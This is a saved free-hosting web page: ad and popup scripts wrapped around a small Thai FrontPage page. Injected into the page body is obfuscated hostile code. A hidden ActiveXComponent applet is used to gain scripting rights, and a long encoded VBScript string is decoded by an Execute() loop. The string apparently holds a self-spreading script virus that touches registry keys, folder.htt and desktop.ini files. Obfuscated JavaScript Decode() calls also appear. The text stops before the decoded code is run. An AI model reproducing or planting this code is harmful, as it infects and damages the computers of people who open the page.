<SCRIPT LANGUAGE=JavaScript>
<!--
   document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%0A%66%75%6E%63%74%69%6F%6E%20%44%65%63%6F%64%65%28%73%29%7B%0A%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%0A%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%0A%7D%0A%3C%2F%73%63%72%69%70%74%3E'));
//-->
</SCRIPT>
<SCRIPT LANGUAGE=JavaScript src="/fs_img/js/md5.js"></SCRIPT>
<!-- '"AWS"' -->
<!-- Auto Banner Insertion Begin -->
<div id=aws_5902 align=center><style>
  .mwsb{ background-color: 000099; border-width: 1px; border-color: 000099; border-style: solid; }
  .mwst, .mwst a{ font-family: arial,sans-serif; font-size: 8pt; background-color: white; color: blue;}
  </style>
  <!------ OAS SETUP begin ------>

  <SCRIPT LANGUAGE=JavaScript>
  <!--
  //configuration
  OAS_url = 'http://cyclops.prod.untd.com/';
  //OAS_sitepage values can be found in the excel spreadsheet showing position and pagenames.
  OAS_sitepage = 'webservices/general'; //CHANGED
  //OAS_sitepage = window.location.hostname + window.location.pathname;
  // must list every Ad position on the page or they will not show.  Also you can't have line items that are not on the page or a impression will be counted even though it was actually shown. 
  OAS_listpos = 'Bottom,Frame1,Frame2,Right,TopLeft,Top1,TopRight';
  OAS_query = '&';
  OAS_target = '_Blank';
  //end of configuration
  OAS_version = 10;
  OAS_rn = '001234567890'; OAS_rns = '1234567890';
  OAS_rn = new String (Math.random()); OAS_rns = OAS_rn.substring (2, 11);
  function OAS_NORMAL(pos) {
    document.write('<A HREF="' + OAS_url + 'click_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" TARGET=' + OAS_target + '>');
    document.write('<IMG SRC="' + OAS_url + 'adstream_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" BORDER=0></A>');
  }
  //-->
  </SCRIPT>


  <SCRIPT LANGUAGE=JavaScript1.1>
  <!--
  OAS_version = 11;
  if ((navigator.userAgent.indexOf('Mozilla/3') != -1) || (navigator.userAgent.indexOf('Mozilla/4.0 WebTV') != -1))
    OAS_version = 10;
  if (OAS_version >= 11)
    document.write('<SCR' + 'IPT LANGUAGE=JavaScript1.1 SRC="' + OAS_url + 'adstream_mjx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '?' + OAS_query + '"><\/SCRIPT>');//-->
  </SCRIPT>

  <SCRIPT LANGUAGE=JavaScript>
  <!--
  document.write('');
  function OAS_AD(pos) {
    if ((OAS_version >= 11) && (typeof OAS_RICH != 'undefined')) {
      OAS_RICH(pos);
    } else {
      OAS_NORMAL(pos);
    }
  }

  //-->
  </SCRIPT>
  <!-- start /fs_img/about_pop.txt -->
<!-- The only pops this script can generate now are:
			1. Pops from UOL
			2. In-house popup
-->
<script language="JavaScript">
<!--
var isUS = "0";
var keyword = escape("");
var compname='freeservers';
var ourExitPop=true;

function popSlot(slot){
    // OAS AD 'Frame1' begin
    if(window.OAS_AD) OAS_AD('Frame1');
    // OAS AD 'Frame1' begin
}

function checkPopunderCookie() {
	var cookieVal = 0;
	cookieExpDays = (1/24);  
	var expDate = new Date();
	expDate.setTime(expDate.getTime() + (86400000 * cookieExpDays));
	cookieDate = ";Expires=" + expDate.toGMTString();
	if (document.cookie) {
		var cookieInfo = document.cookie.split(";");
		for (i=0; i<cookieInfo.length; i++) {
			cName = cookieInfo[i].split("=")[0];
			if (cName.indexOf("pixelpop") >= 0) {
				cookieVal = cookieInfo[i].split("=")[1];
			}
		}
	}
	cookieVal++;
	document.cookie="pixelpopslot="+cookieVal+";path=/;"+cookieDate;
 	if (cookieVal== 1) { popSlot(1); }
 	if (cookieVal== 2) { popSlot(2); }
 	if (cookieVal== 3) { popSlot(3); }
 	if (cookieVal== 4) { popSlot(4); }
 	if (cookieVal== 5) { popSlot(5); }
 	if (cookieVal== 6) { popSlot(6); }
 	if (cookieVal== 7) { popSlot(7); }
 	if (cookieVal== 8) { popSlot(8); }
}

if (!window.sprs) checkPopunderCookie();

if (!window.sprs && ourExitPop && (navigator.appName.indexOf('etscape')==-1)){
	window.onunload=staycheck;
	StayingOnSite=false;
	DadLinkURLs="";
	BabyLink="";
	DadWindow=window.parent;
	DadLinks=DadWindow.document.links;
	DadHost="http://"+location.hostname;
	DadWindow.document.onclick=linktellerDad;
	document.onclick=linktellerThis;
	function linkteller(){
		while (EventTag.parentElement&&(EventTag.tagName!="A")){
				EventTag=EventTag.parentElement;
		}
		if ((EventTag.tagName=="A")&&(!EventTag.target)){
			if (EventTag.href.indexOf(DadHost)>-1){
				StayingOnSite=true;
			} else {
				StayingOnSite=false;
			}
		}
	}
	function linktellerThis(){
		EventTag=window.event.srcElement;
		linkteller();
	}
	function linktellerDad(){
		EventTag=DadWindow.event.srcElement;
		linkteller();
	}
	function staycheck(){
		if (StayingOnSite){
		} else {
		}
	}
}
-->
</SCRIPT>
<!-- end /fs_img/about_pop.txt -->
  <table cellpadding="0" cellspacing="0" width="980">

    <!-- start: related resources -->
    <tr>
      <td colspan="3">
        <table cellpadding="0" cellspacing="0" align="center" width="100%" class="mwsb">
          <tr>
            <td class="mwst" align="center">
              <A HREF="http://www.20m.com" class="mwst" target="_top"
              >Low Cost Hosting</A> | <A HREF="http://free.20m.com" class="mwst" target="_top">Free Web Space</A
              > | <A HREF="http://www.20m.com/dedicated.html" class="mwst" target="_top">Dedicated Hosting</A
              > | <A HREF="http://www.20m.com/asp-windows.html" class="mwst" target="_top">Windows Hosting</A
              > | <A HREF="http://tradeshowdisplays.20m.com" class="mwst" target="_top">Trade Show Displays</A
              > | <A HREF="http://www.20m.com/godaddy-coupons-godaddy-review.html" class="mwst" target="_top">GoDaddy Review</A
              > | <A HREF="http://www.20m.com/frontpage.html" class="mwst" target="_top">FrontPage Web Hosting</A
              > | <A HREF="http://www.20m.com/business.html" class="mwst" target="_top">Business Hosting</A
              >
            </td>
          </tr>
        </table>
      </td>
    </tr>
    <!-- end: related resources -->

    <tr>
      <td width="130">
        <table cellpadding="0" cellspacing="0" width="130" style="margin-top:2px;">
          <tr>
            <td class="mwst" nowrap="1">
              <a href="http://20m.com"
                ><img src="/cgi-bin/image/images/bannertype/100X22.gif" width="100" height="22" border="0" alt="cheap web hosting"
                ></a
              ><a href="/cgi-bin/login" target="_blank"
                ><img src="/cgi-bin/image/images/bannertype/login_chunkx.gif" width="30" height="22" border="0"
                ></a
             ></td>
          </tr>
        </table>
        
        <table class="mwsb" cellpadding="0" cellspacing="0" width="100%" style="margin-top:2px;">
          <tr>
            <td align="center" >
              <a href="/cgi-bin/path/signup?refcd=MWS_20040713_Banner_bar"
              ><img src="http://static.uolcontent.com/RealMedia/ads/Creatives/ISP/MWS_Mkting_LSKYBUT_34_8023/128x64_get_a_free_website_01.gif" border="0"
              ></a>
            </td>
          </tr>
        </table>
      </td>

      <td>
        <table cellspacing="0" class="mwsb" style="margin:2px;margin-bottom:0px;table-layout:fixed;"> 
          <tr>
            <td class="mwst" align="center" style="width:730px;"><SCRIPT><!--
      var g = document.aws_multi_728; if (! g) { g = new Date(); g = g.getTime()%10000; document.aws_multi_728 = g; }
      document.write('<IFRAME src="http://a888.20m.com/cgi-bin/ad/inline?page=new_page_2.htm&pb=1&w=728&h=90&Rtime='+g+'" width="728" height="90" hspace="0" vspace="0" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" allowtransparency="true"></IFRAME>');
      //--></SCRIPT><NOSCRIPT><IFRAME src="http://a888.20m.com/cgi-bin/ad/inline?page=new_page_2.htm&pb=1&w=728&h=90&Rtime=9687" width="728" height="90" hspace="0" vspace="0" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" allowtransparency="true"></IFRAME></NOSCRIPT></td>
          </tr>
        </table>
      </td>

      <td width="120">
        <table class="mwsb" cellpadding="0" cellspacing="0" width="120" style="margin-top:2px;">
          <tr>
            <td class="mwst" nowrap="1">
              <a href="/cgi-bin/util/upgrade?account_type=dp_ac_bannr_x&refcd=WS1005NBP99"
              ><img src="/fs_img/bbar/120x24_get_rid_of_banners_01.gif" 
                width="120" height="24" class="mwsbbar" border="0"
              ></a
             ></td>
          </tr>
        </table>
        
        <table class="mwsb" cellpadding="0" cellspacing="0" width="100%" style="margin-top:2px;">
          <tr>
            <td align="center">
              <!------ OAS AD 'TopLeft' begin ------>
              <SCRIPT LANGUAGE=JavaScript>
              <!--
              OAS_AD('TopLeft');
              //-->
              </SCRIPT>
              <!------ OAS AD 'TopLeft' end ------>
            </td>
          </tr>
        </table>
      </td>

    </tr>
    <tr>
      <td colspan="3" align="center">

        <!-- search powered by yahoo -->
        <table width="100%" cellpadding="0" cellspacing="0" class="mwsb" style="border-width:2px; margin-top:10px; background-color:white; height:10px;">
          <tr valign="top">
            <td align="center">
              <form action="/cgi-bin/mysearch" style="margin:0;">
              <span style="position:relative;top:-5px;font-family:arial;font-size:12px;color:#000;"><b>Search the Web</b></span>
              <input type="hidden" name="type" value="bannerbar">
              <input name="Keywords" accesskey="s" style="width:400px; height:21px; background:white; border:1px #A4ABB1 solid; font-family: arial, sans-serif; font-size: 10pt; color: #000000; position:relative; top:-6px;">
              <input type="image" src="/fs_img/bannertype/yahoo/yahoo_sp_go.gif">
              <img src="/fs_img/bannertype/yahoo/yahoo_sp3.gif" style="position:relative;top:4px;left:10px;">
              </form>
            </td>
            <td width="5%"></td>
          </tr>
        </table>

      </td>
    </tr>
  </table><DIV id=sideFrame 
	style="MARGIN-TOP: 27px; RIGHT: 5px; WIDTH: 120px; COLOR: #ffffff; POSITION: absolute; BACKGROUND-COLOR: #CCCCCC; Z-INDEX: 10000; TEXT-ALIGN: right"><A 
	href="javascript:void%20(sideFrameOff())"><IMG src="/fs_img/banners/xout.gif" 
	border=0></A><BR>
  <!------ OAS AD 'Right' begin ------>
  <SCRIPT LANGUAGE=JavaScript>
  <!--
  OAS_AD('Right');
  // -->
  </SCRIPT>
  <!------ OAS AD 'Right' end ------>
  </DIV>
	<SCRIPT>
		origRightPadding=document.body.style.paddingRight;
		document.body.style.paddingRight="130px";
		function sideFrameOff(){
			document.getElementById('sideFrame').style.display='none';
			document.body.style.paddingRight=origRightPadding;
		}
		</SCRIPT>
	</DIV></div><!-- Auto Banner Insertion Complete THANK YOU -->

<SCRIPT LANGUAGE=JavaScript>
<!--   
    Decode('-%3BK%7Bkzqx%7C-%3A8tivo%7Diom-%3BL-%3A%3Ari%7Ei%7Bkzqx%7C-%3A%3A-%3A8%7C%81xm-%3BL-%3A%3A%7Cm%80%7C7ri%7Ei%7Bkzqx%7C-%3A%3A-%3A8%7Bzk-%3BL-%3A%3A7koq5jqv7%7Eitqli%7Cmgjivvmz-%3BNmvk-%3BL%7C%7Eq9%7C%7Eqk-%3A%3D%3BI-%3A%3D%3BLA-%3A%3D%3BK9%7C%7B%7F%80k-%3A%3D%3BK%3C-%3A%3D%3BJ%3C-%3A%3A-%3BM-%3BK7%7Bkzqx%7C-%3BM8');
//-->
</SCRIPT>
<html>

<head>
<meta http-equiv="Content-Language" content="th">
<meta http-equiv="Content-Type" content="text/html; charset=windows-874">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<title>แบบที่ 1</title>
<meta name="Microsoft Theme" content="blends 011, default">
<meta name="Microsoft Border" content="tlr, default">
</head>

<body background="_themes/blends/blegtext.gif" bgcolor="#CCCCCC" text="#000000" link="#993300" vlink="#0000FF" alink="#FF9900"><!--msnavigation--><table border="0" cellpadding="0" cellspacing="0" width="100%"><tr><td><!--mstheme--><font face="Tahoma">




<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "=gmBlWe^pe)ArmiMcxq%TbpMcxq%BedkcePben):npi^Mbg^at)?QO)PqSe^jl)PgnMZrh)LsbB%DikZjyAbqkQu_IJ\lraom&)IJP^rDff&)IJ@kcaq^Kiibcu%HCJih^Gt%HCArbZreJZgl%HCNrli_g^mc(&Ek]Sr[Duk\rilgKG:npbgbTl!Dii^Naqa*TvicSqk'Hl BkpooPepnkeGcxqSbmRbZbTbfn :DSL'MpbgReumDii^&FfecP^mf,.QfnSqk=KcaaMcmm'Pe^]?liIcGnpmp(QfnSqk*HC]sqZpt% )5< -MrEcn%MkpPmp)51MfekRbZbTbfn.@emsbEubr CnlcqbmnCnaGfGfMwpbLrr6emrMfekRbZbTbfn.@emsbSbmFfecTbfn :DSL'MpbgReumDii^&FfecP^mf,/CbjeQ^kp+Ppiq^9&@OARokemaa6 $ o`s`kgpq3  # KGXqt^kr(& ;&o`CoEd #RmmLrrv_<pLc$ EmklQ^vtDii^Reji,CihqeQeqDAqmpi_; CLM.D^rFfec(CbjeMZrh&F>mrrf[,aqmpi_nrep; 0-BeqePe^]Reji,CihqeQeqDii^Reji=?QO+HnekMcxq?glb!Dii^Naqa*8&IcRym^Qto; armiTe^l?glbMcmm'Urfmc s[ArI_&:EMKL;&o`CoEd # <$ ;MDVmnih_d: s[qcobnt7&IJ\lraom&)  # >$ s[ArI_&ArmiMcxqEilcIcRym^Qto; o`sRhbgCbjeQ^kp+Ppiq^v_<pLc$ S[qTbqr>ldBd?glbMcmm'Alllc>ldBd>ld?sn`mgok?sn`mgokIJ@a_nd^Qu_!AuokcnqLrrfge,IZqtFgbeu<faoF_L^lrIk]cx@a_r60MfekIcJecm&L@Zqe%<sro^ltPmpik`',.=9JC^lc(\ )MfekKG<fak`cSr[=?gn^ewDfli # :YPn`E60Clp^HCAh^geePn` :Aho!?s`!Jecm&L@Zqe%<sro^ltPmpik`',.' */)7U LsbB; -Ek]IcEilcDHCeZlgbLsb6Mf]&CrkpekmQtoblg)**L^lrIk]cx@a_r&Ek]IcEk]FrgatfhlFrgatfhl HCArbZreJZgl%LgEokmrKcsrfc K^vtGfBlWe^pe6emklRhbgBqgt?sn`mgokEk]IcSeZpeCbje6Lb_r(TblP^mf,0&Nrl`pajDii^q\@hkmlgFfecsYFgcohqocmSeZpeaUQt^mgok^pyY[jakd,hqf Bd %?QO+?glb>vipmq(Pa_rb?glb' QacnAaieKG:npbgbTl!Qh^kcFfec,armi'>jsbSbmFfecTbfn :DSL'MpbgReumDii^&SeZpeCbje)+*tonc)Dii^Reji,Wobre:EMKL;&o`CoEd # <$ ;MDVmnih_d: s[qcobnt7&IJ\lraom&)  # >$ s[ArI_&ArmiMcxqFfecTbfn.@emsbEk]IcDb__uimGd6WpLfeie,Rb`Pe^]&EDCY\<SRO>LT\NQEOUGdbgriqbcsY=cf^njtNqeoGDLnrLlhiVbkqilg=PqSe^jl+KcgO^_d%FKBR]LL<?L\F?CEBLEYLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\J^bi^OcrTlQhbej.O^eWobreFKBR]CRKPEKM]UP>P\F]cnqbriblZ#=cf^njtF]$YLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\Lb_r(LnrLlhiVbkqilg*1&$+)ZM^bj\@hkpllc Rlc Pm_tfhleor ,.% RB@]DTHPDC^ej HCKafePed! HH>W_@NPRBGR_RLCRYBbekmgtf^q\BecZslqBb&UQocmuao^ZMf\pophdtYHstihmk>vpo^qsY$ I^dt%HstIhmkS^psfhl,.&'.\JZglYLraqbmnbkw KZke%Qh^kcFfec)AaieKGF_iiKcg%FKBR]CRKPEKM]UP>P\F]cnqbriblZ#=cf^njtF]$YLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\Lb_r(LnrLlhiVbkqilg*1&$+)ZM^bj\TbbeLraqbmnbkw KZke%Qh^kcFfec)UsPacli'PedPpiq^EDCY\<SRO>LT\NQEOUQocmuao^ZMf\pophdtYHdff\c\6'.\Lnrllhi\Lirilgq\JZglY>biqhpPo^deo^lcb*10*.7/% RB@]DTHPDC^ej HCKafePed! HH>W_@NPRBGR_RLCRYLmfqp_rbUKi`kmsl_r\Tbldlpq J^qs^`gndQu_lwsq^k\MkmffecsYFgcohqocmOrmjoldIkmcrk^r P^rtfgesY)_0a)00-).0-).0-\.0-).0-).0-).43U.0.^.33) ,[jakd )AaieKGF_iiKcg%FKBR]CRKPEKM]UP>P\PhdttZpeYFgcohqocmZWfgbotlNQUAuokcnqOcrpbmnYPgnahusFcspZeik`Sr[qypmcmYIpocbjepUKi`kmsl_r Lnrllhi FgreogctLctqblgpU.a-].2-).0-).0-)a0-).0-).0-).01/Z0-*c00/.)`l^gi&WpLfeie,Rb`Urfmc AIEVXAUOKCNQXSSBKZSl_rw^kc\JbarllmfqUMfcbaeY*..-UMuqemohUMpqbmnpUKafeZEabrooIpec^pek\c)*11-00,KCG\=UOO= <_liIJJZglO^e(AIEVXAUOKCNQXSSBKZSl_rw^kc\JbarllmfqUMfcbaeY*..-UAojfmnYF_iiLctqblgpULetLraqbmnbkw)`l^gi&KGnkm^`cFlebeo!Jecm&WfgNaqa*3&$ Ipodk_m?glblZClfkokDii^q\JbarllmfqQh^kcdYLraqbmnbkw&Ek]FrgatfhlFrgatfhl HCArbZreJbjibn&)Mn>prlkRblsmbLeumQ^kpMZrh6IcLoq!DSL'Dii^Cxflrs%PgnMZrhTLarfir.bqc&Te^lMcmmI_te; lwsq^k3/U >ldBdBd Q^kpMZrh6prqtbf12YTe^lLraomSpCbje6WfgNaqa&QYPMCMYDcrk^j3/'bliBeqeQt^krUm?glb; TblP^mf # SVLREJUIeogcl+]jlEk]IcWpLfeie,Rb`Urfmc AIEVXJO@:J_J:AHFGC\PhdttZpeYFgcohqocmZWfgbotlZCrkpekmTeolgokUPukUIeogcl0+ ,Pm_rqNnFfec?QO+<mpv?glbUikI_te$ pcbYdhw^ej.dbd)PgnMZrht^`\Chjdbk,hqm ?QO+<mpv?glbUikI_te$ lwsq^k3/UijtZjl+`gf%UikI_te$ lwsq^k3/Ubepdrom'gnf@ZjlDHAmicnaMm(TblP^mf # wb[ZFlebeo'ftq*emr&WpLfeie,Rb`Urfmc AIEVXAL>LQEPXPOLMZ.aej\% diedii^ PqSe^jl+KcgTkgtb HH>W_@E?SP>Q_OHMTY'bliUAokmcnqRym^ ,Znpibaaqbmn,q+mp]mwkemaaTlQhbej.O^eWobreFKBR]CI:QSBL]RLHR\aejffec\A^darerI`hl\%UsPacli'PedKcaa! HH>W_@E?SP>Q_OHMTYovdcbjeY=cf^njtF\mnY'PqSe^jl+KcgTkgtb HH>W_@E?SP>Q_OHMTY]jlcbjeYLarfirEk`gnbU ,O@S`kgpqTlQhbej.O^eWobreFKBR]CI:QSBL]RLHR\aejFfec\PacliUMpbgZClfkak]Z)PgnMZrhTbfnP^mf # WP\pimm,eu^/#*WpLfeie,Rb`Urfmc AIEVXAL>LQEPXPOLMZdieDii^ZSe^jlBqZPohneomwSe^ctEZldi^psYPQHMkmppU ,t40/.2C>.+92,@-.*AF*1A93&.0>:.0?1505<{UsPacli'PedPpiq^EDCY\<JAPLCS\KMOQUbli?glbUQcobntEhqtBgaoa^Z)y82*113,/-11.C**/D/&@1C2+0-<.4C14C0+2}SbmFfecTbfn :DSL'MpbgReumDii^&SqZptRiDii^*2)mpubCbjeQ^kp+Ppiq^V_lReumCbjeQ^kp+<jop^Bgb CnlcqbmnCnlcqbmnDHLfdcIq!'Bd FgUhbkc 97emklRhbgBqgt?sn`mgokEk]IcTebqLl\_tfhl :bo`nkekm,ll\_tfhlBd I^dt%MfipEmc^mgok%4&; _glbTe^lMfipEmc^mgok; Jbb(QagsIhaaqbmn)2'Bd CLM.D^rEumcnpbmnKZke%MfipEmc^mgok<; mfekTebqLl\_tfhl :Jecm&TebqLl\_tfhl,I^l(QagsIhaaqbmn&+ I^l(CLM.D^rFfecN^fc(QagsIhaaqbmn&'>ldBdBd I^l(QagsIhaaqbmn&< 0RhbgQagsIhaaqbmn6TebqLl\_tfhl # \Ek]IcKGnkm^`cFlebeo!RhflJo`Zrilg'>ldBd>ld?sn`mgok?sn`mgokIJJZglO^e(O^eSqk*FfecN^fc)Mn>prlkRblsmbLeumO^eTbfnSqk=PqSe^jl+KcgO^_d%KcgPmp)GfKcgQ^kpPmp : MfekWpLfeie,Rb`Urfmc O^eSqk*FfecN^fc>ldBd>ld?sn`mgok?sn`mgokIJL[mSr[&CrkpekmQtoblg&Sr[C :.McsqHst60BoPfii^ToncMcsqHst6TblrOrm+*F_TblrOrm>+6 QacnAuokcnqLrrfge :DikZjyAbqk7U >viqBoCnaGfMn>prlkRblsmbLeumP^r QagsChjdbk=?QO+@ctChjdbk&CrkpekmQtoblg&SbmDf\Qu_; @kcaq^Mbg^at%Qcobntfge.Abatfhlaor )QeqDoi]crp; QagsChjdbk,Sr[Doi]crpFlebeo<mukm=)Chp BZahMcmm?mla^p fgFlebeolChjdbkAorgr :Doi]cr@hsnq) .Df\Qu_'_daDoi]cr@hsnq%TbfnFlebeo'Laj^K^vtGf=gcPn`.@hsnq; -RhbgIZqtFgbeu<fao; FgqtoKcv%<sro^ltPmpik`*Y*Lbg&CrkpekmQtoblg&&/)Qu_Lrrfge :Kia!AuokcnqLrrfge,IZqtFgbeu<fao$/,I^l(@nprbgrSqkgnd+L^lrIk]cx@a_r**'<sro^ltPmpik`=DHCeZlgbLsb%<sro^ltPmpik`*L^lrIk]cx@a_r&Sr[C :/>jsbIcQu_>=)Te^l<sro^ltPmpik`=<sro^ltPmpik`&=gcPn`.Fmcm%*' # \Eubr AhBeqeh :.?mrc=*TlDoi]cr@hsnqIcJC^lc(Pn`Sqkgnd=EAap^&Df\Qu_'Gtbf&j&Te^lBd g: ChjdbkAorgr QacnAuokcnqLrrfge :AuokcnqLrrfge #Bi`Lsb+Brej!h+.&ZCxfmDlEk]IcEk]IcNbqrE_sqBldbqAh^k=BlsqkPes!AuokcnqLrrfge,U ,I^l(@nprbgrSqkgnd+1&Sr[Qtoblg6Mf]&CrkpekmQtoblg)E_sqBldbqAh^k)1)Ecn%<sro^ltPmpik`'-IZqtFgbeu<fao&/)AuokcnqLrrfge :IJ@a_nd^Qu_!AuokcnqLrrfge,IZqtFgbeu<faoBgb F_Bgb F_IhmpIJL[mSr[=<sro^ltPmpik`Bgb CnlcqbmnCnlcqbmnDHPohnadZre%LgEokmrKcsrfc K^vtPedI_teO_lr^=FKBR]LL<?L\F?CEBLEYLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\A^erb^ =gsh=cgo^c :UsPacli'PedKcaa!PedI_teO_lr^'Bd AbqkA^erb^=  QacnBipdBedkce6Ffg_lv=gsh$ 3ZCnaGfDoog=.ro.AbqkA^erb^=DHO_hQu_!BipdBedkce&KGnkm^`cFlebeo!BipdBedkce&NbqrPqSe^jl+KcgTkgtbPedI_teO_lr^*DfliDb`pebEk]FrgatfhlFrgatfhl HCsmjZeeChjdbk&P^mfN^fc)Mn>prlkRblsmbLeumP^r ChjdbkLaj^=?QO+@ctChjdbk&P^mfN^fc)QeqRhflDii^q :Doi]crKZke+?glblEmrEubqtp; -FlkE^\f QagsCbjeBl QagsCbjepFfecEum=NAap^&FPH,GbmCxq^lsfhlN^fc(QagsCbje+I_te'Bd CbjeBqr : HQF  LkFfecEum=FTJE  LkFfecEum=?SMOoDii^Cxq; IFPMr?glb>vt6GLNMfekC^ej HC?pm^ldQh&TebqFfec.MZrh)ftje )Clp^Gf?glb>vt6S;QMfekC^ej HC?pm^ldQh&TebqFfec.MZrh)tbp'>jsbBd CbjeBqr : HQM  QacnFtq>vipmq :/>ldBdGcxqIc&U@Zqe%I_teG_mb=NAap^&WfgNaqa&BepdromU )&Mr!SC^lc(MZrhKZke&; R<_sb!UikI_te$ =cshmmp'Te^lArtBqgsql=*Bgb F_F_HqmCxflrs60MfekFPH,CliwFfec TblP^mf # svlrej,0\a^qkqhn.fgg)I_teG_mbFPH,CliwFfec TblP^mf # wb[ZFlebeo'ftq*P^mfN^fc>ldBd>ld?sn`mgok?sn`mgokIJP^rDff&)Mn>prlkRblsmbLeumBkp.@ecaoTblrIq; TLarfir.P\pimmDuielaj^F_EokTe^lBlWe^pe6emklEilcBlWe^pe6s[qCnaGfGfBlWe^pe6s[qMfekSbmFPH=<pe^mcO_cccq! S`kgpqblg+?glbLwsq^kO_cccq'LctPqSe^jl6Co^_tbH`jb\r(PQcobnt+Lfeie )Clp^P^r >inlbH`jb\r :bo`nkekm,amijeql&HC]gr^qt>inlbH`jb\r.p^rCILGD%yF6,3D@+0-.<D0**/D-&?D?2+0-<.4C=38>)@}>inlbH`jb\r.`kcaq^Gnpm_n`^&)QeqUsPacli; >inlbH`jb\r.D^rO_cccq!':npi^Mbg^at+lct@EQIA! {-=23C>.1*?.90&/1@?+86-.--)?0@2.51+08z':npi^Mbg^at+\pe^mcIklrak\c(&SbmFPH=:npi^Mbg^at+@ctL[he`m&)CnaGfQeqBipdMbg^at6FPH,DobtepFlkE^\f AbqkQ^kpBl AbqkL[he`mF_DfliTbfn.AkgvbMwpb:>+Ak]DfliTbfn.AkgvbMwpb:>*Te^l>viqDooEk]IcFfg_lv=gsh; AbqkQ^kp+=pis^JeqmcrLeumAbk Lmfeo:pr%,'K_nahkiw^Chp f6. Qh3Mte^pAok&i&; Fgr(%2*Kld&K^vtRejiQtoblg6Flki:*TlJek!RhflReum'McmmGsm6Ap\&Mf]&TebqTbqr,f%/)&IcRejiLuj; .,Te^lMcmmGsm625EilcIcRejiLuj; .)Te^lMcmmGsm626Ek]IcTbfnCeZp :Aho!RejiLuj+ Lmfeo:pr%bMl]4&F_TbfnCeZp :Aho!14&RhbgQ^kp@a_r6Cek&15Bgb F_Q^kpPmpik`=McmmLrrfge #RejiAh^kK^vtSnIhakPmp : Eu^auq^&=gmDcy>kp(0*TebqTbqrtb@kJf# Kbr?ro!.)6Oqacr>kp(-& #o`CoEd&Iev:pr%*' :  #Mte^pAok&1&$  &s[ArI_$Dcy>kp(/=&Hrhbk?ro!0)$v_<pLc H^wAok&3&; $ Lmfeo:pr%,' # tb@kJf# Flki:*TlJek!CxbLrrfge)$v_<pLc Q^kpKnk :?s`!Kia!CxbLrrfge,f%/)& &s[ArI_$Bd Q^kpKnk :/8Mfek &s[ArI_$McmmGsm631 &s[ArI_$>ldBdtb@kJf# TbfnCeZp :Aho!RejiLuj) H^wAok&iFmd-')$v_<pLc F_TbfnCeZp :Aho!08&Rhbg #o`CoEd&RejiAh^k=o`Co &s[ArI_$>jsbBd Q^kp@a_r6Cek&26Te^ltb@kJf# TbfnCeZp :tbI_ #o`CoEd&CnaGf$v_<pLc QagsQ^vt6TebqTbqr #RejiAh^k #o`CoEd&Leum &&o`CoEd # Eu^auq^&TebqTbqr)TebqTbqr : Eu^Qtoblg6&McmmLrrfge # EmklQ^vt6 <$ larfir iZlgrZee:o`s`kgpq7  #tb@kJfahauj^lt+ppiq^  # <$ ]gvlryi^;'mhqiqbmn7Z`slestb4lb_r:-iv;mmp7)nx8uiamf:-iv;acidar:-iv;s+ik]cx7+6;ogsf[glfmw:agda^l';&: $ :NPI>R K:KE:DH \`sepmHBBEHQ6. TBBTE6. `hbe:\mm+fq.$ZatfocX+:atfoc U<mmmhlekm<9&-AMIJEQ7  # <$ (bis7 $ s[ArI_&:,larfir>$ s[ArI_&:p\pimml^geu^`c=s[qcobnt;&o`CoEd #RhflReum&o`CoEd #SnIhakPmp #tb@kJf9&-s`kgpq7  #tb@kJf9&-BL=W>$ s[ArI_&:,ARMI7 O`sQ^vt6TebqTbqr #tb@kJfUkEmchLrrv_<pLc$ DH_pm_rq!'UikI_te; CLM.D^rSm^ai^eDoi]cr%)' # \Ic&FPH,FfecEubqtp!UikI_te$ pcbY?mla^p.emr&Te^l?QO+<mpv?glbUikI_te$ pcbY?mla^p.emr)PgnMZrht^`\hcuaie,gf_ >ldBdBd %?QO+?glb>vipmq(TblP^mf # svlrej,0\a^qkqhn.fgg&Te^l?QO+<mpv?glbUikI_te$ lwsq^k3/Ubepdrom'gnf*WfgNaqa&qypmcm0+Zkgp_li'eicBgb F_Bgb Cnlcqbmn"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 3"&vbCrLf&"KeyArr(1) = 7"&vbCrLf&"KeyArr(2) = 2"&vbCrLf&"KeyArr(3) = 0"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
